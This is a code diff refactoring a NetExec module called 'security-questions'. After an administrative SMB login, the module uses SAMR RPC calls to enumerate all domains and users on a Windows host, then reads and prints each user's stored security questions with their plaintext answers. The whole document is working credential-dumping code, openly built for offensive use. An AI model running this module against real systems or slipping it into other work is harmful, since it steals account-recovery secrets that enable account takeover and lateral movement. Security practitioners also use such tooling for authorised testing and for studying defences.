@@ -1,129 +1,117 @@
-from impacket.dcerpc.v5 import samr
-from impacket.nt_errors import STATUS_MORE_ENTRIES
-from impacket.dcerpc.v5.rpcrt import DCERPCException
+from dataclasses import dataclass
 from json import loads
-from traceback import format_exc as traceback_format_exc
+
+from impacket.dcerpc.v5 import samr
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.nt_errors import STATUS_MORE_ENTRIES, STATUS_INVALID_INFO_CLASS
 from nxc.helpers.misc import CATEGORY
 from nxc.helpers.rpc import NXCRPCConnection
+from nxc.playbooks.results import ActionResult, ResultStatus
 
 
 class NXCModule:
-    """
-    Module by Adamkadaban: @Adamkadaban
-    Based on research from @0gtweet (@gtworek)
-
-    Much of this code was copied from add_computer.py
-    Reference: https://hackback.zip/2024/05/08/Remotely-Dumping-Windows-Security-Questions-With-Impacket.html
-    """
+    """Module by @Adamkadaban, based on research from @0gtweet."""
 
     name = "security-questions"
     description = "Gets security questions and answers for users on computer"
     supported_protocols = ["smb"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
-    def options(self, context, module):
-        pass
+    @dataclass
+    class ResultData:
+        domains: list[dict]
+        users: list[dict]
+
+    result_type = ResultData
+
+    def options(self, context, module_options):
+        """No options available."""
 
     def on_admin_login(self, context, connection):
-        self.__domain = connection.domain
-        self.__domainNetbios = connection.domain
-        self.__kdcHost = connection.hostname + "." + connection.domain
-        self.__target = self.__kdcHost
-        self.__username = connection.username
-        self.__password = connection.password
-        self.__targetIp = connection.host
-        self.__port = context.smb_server_port
-        self.__aesKey = context.aesKey
-        self.__hashes = context.hash
-        self.__doKerberos = connection.kerberos
-        self.__nthash = ""
-        self.__lmhash = ""
-
-        if context.hash and ":" in context.hash[0]:
-            hashList = context.hash[0].split(":")
-            self.__nthash = hashList[-1]
-            self.__lmhash = hashList[0]
-        elif context.hash and ":" not in context.hash[0]:
-            self.__nthash = context.hash[0]
-            self.__lmhash = "00000000000000000000000000000000"
-
-        self.getSAMRResetInfo(context, connection)
-
-    def getSAMRResetInfo(self, context, connection):
-        dce = None
-        server_handle = None
-        domain_handle = None
+        domains, users, errors = [], [], []
+        rpc, server = None, None
         try:
-            dce = NXCRPCConnection(connection).connect(r"\samr", samr.MSRPC_UUID_SAMR)
-
-            # obtain server handle for samr connection
-            resp = samr.hSamrConnect(dce)
-            server_handle = resp["ServerHandle"]
-
-            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
-            domains = resp["Buffer"]["Buffer"]
-
-            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domains[0]["Name"])
-
-            # obtain domain handle for samr connection
-            resp = samr.hSamrOpenDomain(dce, serverHandle=server_handle, domainId=resp["DomainId"])
-            domain_handle = resp["DomainHandle"]
-
-            status = STATUS_MORE_ENTRIES
-            enumeration_context = 0
-
-            # try to iterate through users in domain entries for connection
-            while status == STATUS_MORE_ENTRIES:
+            rpc = NXCRPCConnection(connection).connect(r"\samr", samr.MSRPC_UUID_SAMR)
+            server = samr.hSamrConnect(rpc)["ServerHandle"]
+            for domain in self.enumerate_entries(rpc, server, samr.hSamrEnumerateDomainsInSamServer):
+                sid = samr.hSamrLookupDomainInSamServer(rpc, server, domain["Name"])["DomainId"]
+                sid_text = sid.formatCanonical()
+                domains.append({"name": str(domain["Name"]), "sid": sid_text})
+                if sid_text == "S-1-5-32":
+                    continue
+                handle = samr.hSamrOpenDomain(rpc, serverHandle=server, domainId=sid)["DomainHandle"]
                 try:
-                    resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle, enumerationContext=enumeration_context)
-                except DCERPCException as e:
-                    if str(e).find("STATUS_MORE_ENTRIES") < 0:
-                        raise
-                    resp = e.get_packet()
-
-                for user in resp["Buffer"]["Buffer"]:
-                    try:
-                        context.log.info(f"Querying security questions for User: {user['Name']}")
-                        # request SAMR ID 30
-                        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6
-                        r = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
-                        info = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserResetInformation)
-
-                        reset_data = info["Buffer"]["Reset"]["ResetData"]
-                        if reset_data == b"":
-                            continue
-                        reset_data = loads(reset_data)
-                        questions = reset_data["questions"]
-
-                        if len(questions) == 0:
-                            context.log.highlight(f"User {user['Name']} has no security questions")
-                        else:
-                            for qna in questions:
-                                question = qna["question"]
-                                answer = qna["answer"]
-                                context.log.highlight(f"{user['Name']} - {question}: {answer}")
-
-                        samr.hSamrCloseHandle(dce, r["UserHandle"])
-                    except samr.DCERPCException as e:
-                        if "STATUS_INVALID_INFO_CLASS" in str(e):
-                            context.log.debug(f"Failed to query security questions for User: {user['Name']}: {e!s}")
-                            continue
-                        else:
-                            context.log.fail(f"Failed to query security questions for User: {user['Name']}: {e!s}")
-                            context.log.debug(traceback_format_exc())
-                enumeration_context = resp["EnumerationContext"]
-                status = resp["ErrorCode"]
-
+                    for user in self.enumerate_entries(rpc, handle, samr.hSamrEnumerateUsersInDomain):
+                        record = {"domain": str(domain["Name"]), "domain_sid": sid_text, "username": str(user["Name"]),
+                                  "rid": int(user["RelativeId"]), "raw": None, "reset_data": None, "questions": [], "status": "pending", "error": None}
+                        users.append(record)
+                        user_handle = None
+                        try:
+                            user_handle = samr.hSamrOpenUser(rpc, handle, samr.MAXIMUM_ALLOWED, user["RelativeId"])["UserHandle"]
+                            info = samr.hSamrQueryInformationUser2(rpc, user_handle, samr.USER_INFORMATION_CLASS.UserResetInformation)
+                            record["raw"] = info["Buffer"]["Reset"]["ResetData"]
+                            record["reset_data"] = loads(record["raw"]) if record["raw"] else None
+                            record["questions"] = record["reset_data"].get("questions", []) if record["reset_data"] is not None else []
+                            record["status"] = "queried"
+                            for item in record["questions"]:
+                                context.log.highlight(f"{record['username']} - {item['question']}: {item['answer']}")
+                        except DCERPCException as e:
+                            if e.get_error_code() == STATUS_INVALID_INFO_CLASS:
+                                record["status"] = "unsupported"
+                                record["error"] = str(e)
+                            else:
+                                record["status"] = "failed"
+                                record["error"] = str(e)
+                                raise
+                        except Exception as e:
+                            record["status"] = "failed"
+                            record["error"] = str(e) or type(e).__name__
+                            raise
+                        finally:
+                            self.close_handle(rpc, user_handle, errors)
+                        if errors:
+                            break
+                finally:
+                    self.close_handle(rpc, handle, errors)
+                if errors:
+                    break
         except Exception as e:
-            context.log.fail(f"Error: {e}")
-            context.log.debug(traceback_format_exc())
-
+            errors.append(str(e) or type(e).__name__)
         finally:
+            self.close_handle(rpc, server, errors)
+            if rpc is not None:
+                try:
+                    rpc.disconnect()
+                except Exception as e:
+                    errors.append(f"Disconnecting SAMR: {e}")
+        for error in errors:
+            context.log.fail(error)
+        status = ResultStatus.FAILED if errors else ResultStatus.SUCCESS if any(user["questions"] for user in users) else ResultStatus.SKIPPED if users and all(user["status"] == "unsupported" for user in users) else ResultStatus.NEGATIVE
+        return ActionResult("smb", self.name, connection.host, status, self.ResultData(domains, users), error="; ".join(errors) or None)
+
+    def close_handle(self, rpc, handle, errors):
+        if handle is not None:
             try:
-                if domain_handle is not None:
-                    samr.hSamrCloseHandle(dce, domain_handle)
-                if server_handle is not None:
-                    samr.hSamrCloseHandle(dce, server_handle)
+                samr.hSamrCloseHandle(rpc, handle)
             except Exception as e:
-                context.log.debug(f"Error during SAMR cleanup: {e}")
-            dce.disconnect()
+                errors.append(f"Closing SAMR handle: {e}")
+
+    def enumerate_entries(self, rpc, handle, function):
+        cursor = 0
+        while True:
+            try:
+                response = function(rpc, handle, enumerationContext=cursor)
+            except DCERPCException as e:
+                if e.get_error_code() != STATUS_MORE_ENTRIES:
+                    raise
+                response = e.get_packet()
+            if response["Buffer"]:
+                yield from response["Buffer"]["Buffer"]
+            if response["ErrorCode"] != STATUS_MORE_ENTRIES:
+                if response["ErrorCode"]:
+                    raise RuntimeError(f"SAMR enumeration failed with status {response['ErrorCode']}")
+                return
+            next_cursor = response["EnumerationContext"]
+            if next_cursor == cursor:
+                raise RuntimeError("SAMR enumeration cursor did not advance")
+            cursor = next_cursor
